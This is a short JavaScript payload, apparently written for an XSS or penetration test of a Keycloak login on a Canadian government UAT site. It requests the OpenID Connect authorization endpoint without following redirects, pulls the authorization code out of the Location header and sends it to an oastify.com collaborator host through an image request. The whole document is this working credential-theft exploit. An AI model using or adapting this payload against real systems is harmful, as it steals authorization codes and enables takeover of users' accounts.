fetch('/auth/realms/individual/protocol/openid-connect/auth?client_id=ccdr-ui&redirect_uri=https%3A%2F%2Fuat.ised-isde.canada.ca%2Fccdr%2Freporting-entity%2Fsearch&response_type=code&scope=openid+profile+email&state=2b20cc9d5c6d4ca693ee4767656bd312&ui_locales=en', {redirect: 'manual'})
.then(r => {
  let loc = r.headers.get('Location');
  let code = new URL(loc).searchParams.get('code');
  new Image().src = 'https://m6td3v4kprur8qeydu7kq0v7lyrpfi37.oastify.com/' + code;
});
